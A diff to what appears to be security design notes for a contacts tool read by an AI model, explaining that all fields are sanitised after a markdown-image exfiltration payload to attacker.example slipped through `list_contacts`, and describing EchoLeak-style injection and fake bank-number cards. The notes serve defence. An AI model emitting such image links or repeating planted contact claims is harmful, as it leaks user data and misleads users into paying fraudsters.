@@ -93,6 +93,15 @@ is the EchoLeak shape
 where a crafted message nobody opened exfiltrated data during ordinary background
 processing.
 
+**Every field, not only the note.** There are two cleaners — one for the note,
+which keeps paragraph breaks, and one for the single-line fields, which does not
+— and they run the same three passes. Nothing reaching the model takes a third
+path with fewer of them. That is worth stating because it was not true for a
+while: the short fields were only stripped of invisible characters, and a
+formatted name of `![a](https://attacker.example/x.png?d=…)` came back through
+`list_contacts` intact, unfenced, for a client to render and fetch. A name is
+not safer than a note by virtue of being short; the same stranger wrote both.
+
 **The attack that matters most here does not run a tool.** A card asserting that
 a bank's real number has changed, or that an invoice should go to a different
 account, needs the model to do nothing except repeat it. There is no call to gate
